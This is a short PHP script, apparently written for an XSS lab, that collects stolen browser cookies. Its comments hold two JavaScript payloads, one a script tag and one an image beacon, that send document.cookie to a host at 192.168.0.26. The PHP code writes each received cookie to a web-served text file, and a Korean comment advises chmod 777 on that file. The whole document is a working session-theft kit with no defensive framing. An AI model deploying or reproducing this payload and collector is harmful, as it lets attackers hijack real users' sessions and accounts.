<?php
// <script>document.location="http://192.168.0.26/cookie.php?cookie="+document.cookie;</script>

/*
	var cookie = document.cookie;
	var url = "http://192.168.0.26/cookie.php?cookie="
	new Image().src = url + cookie;
*/

$cookie = $_GET['cookie'];

// 파일에 쓰기 권한 줘야함!!
// chmod 777 "file_name"
$save_file = fopen("/var/www/html/cookie.txt", "w");
fwrite($save_file, $cookie);
fclose($save_file);
?>